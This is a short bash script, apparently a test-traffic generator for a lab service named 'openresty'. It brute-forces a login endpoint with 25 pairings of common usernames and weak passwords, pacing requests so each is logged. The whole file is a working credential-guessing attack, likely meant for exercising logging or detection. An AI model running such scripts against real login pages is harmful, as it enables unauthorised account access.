#!/usr/bin/env bash
set -e
TARGET=${1:-http://openresty}

echo "Starting login brute force attack..."

# Common usernames and passwords for brute force
usernames=("admin" "root" "user" "test" "administrator")
passwords=("password" "admin" "123456" "letmein" "admin123")

count=0
for user in "${usernames[@]}"; do
  for pass in "${passwords[@]}"; do
    curl -s -o /dev/null -X POST "${TARGET}/login?attempt=${count}" \
      -d "username=${user}&password=${pass}" \
      -H "Content-Type: application/x-www-form-urlencoded" || true
    ((count++))
    sleep 0.15  # Increased delay to ensure each request is logged
  done
done

echo "Sent ${count} login attempts (brute force)."
